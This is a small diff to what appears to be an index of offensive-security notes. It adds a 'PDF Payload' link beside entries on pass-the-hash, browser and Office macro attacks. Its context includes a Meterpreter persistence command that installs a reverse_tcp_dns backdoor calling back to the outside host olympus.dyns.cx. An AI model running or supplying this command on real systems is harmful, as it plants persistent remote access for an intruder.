@@ -15,6 +15,7 @@
 [Pass the Hash](/passthehash)
 [Browser Attacks](/browserattacks)
 [Office Macro Attacks](/officemacros)
+[PDF Payload](/pdfpayload)
 # Writing Exploits
 # Post Module Tricks
 run persistence -P windows/meterpreter/reverse_tcp_dns -S -i 9000 -p 9998 -r olympus.dyns.cx
